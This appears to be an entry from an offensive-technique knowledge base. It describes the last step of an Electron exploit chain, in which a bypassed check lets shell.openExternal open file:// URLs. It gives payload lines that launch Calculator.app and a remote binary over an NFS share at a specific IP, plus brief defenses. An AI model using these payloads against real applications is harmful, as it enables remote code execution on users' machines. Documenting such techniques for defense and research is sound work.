---
id: proc-electron-shell-rce
tags:
  - rce
  - shell-openexternal
  - file-execution
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Electron
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:28.573Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
---
# Execute-Arbitrary-File-Open-for-RCE

## Summary

This procedure finalizes the attack by calling Electron's shell.openExternal with a bypassed file URL, opening arbitrary local applications or attacker-controlled files, achieving remote code execution on the victim's machine.

## Description

With checks bypassed, the preload.js handler at line 45 executes shell.openExternal on file:// URLs. On macOS, this launches apps like Calculator.app; on Windows, it can mount and run remote binaries via NFS/SMB shares (e.g., file:///net/192.241.239.91/.../hack2.app), leading to full RCE.

## Requirements

1. RegExp bypass active from previous step.
2. Vulnerable Electron preload.js with window.onload attached to user DOM.
3. Local file paths or network shares accessible.

## Defense

Defensive measures and detection strategies:

- Restrict shell.openExternal to whitelisted domains/paths in preload.
- Enable Electron sandbox and disable nodeIntegration.
- Monitor process creation for unexpected app launches (e.g., via Sysmon on Windows).

## Objectives

1. Invoke shell.openExternal on controlled paths.
2. Launch local or remote executables.
3. Achieve system-level code execution.

## Instructions

### Step 1: Trigger the Handler

**Context**: The delayed link click from the attacker page activates the onload event.

The JS creates and clicks: <a href="file:///Applications/Calculator.app"></a>

> Expected: Preload.js calls shell.openExternal without regex block.

### Step 2: Adapt for Custom Paths

**Context**: Modify the href for RCE payloads, e.g., remote binary.

Use: a.href = 'file:///net/192.241.239.91/var/nfs/general/hack2.app';

> Expected: App or binary executes if share is mounted/accessible.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[rce]]
- [[shell-openexternal]]
- [[file-execution]]
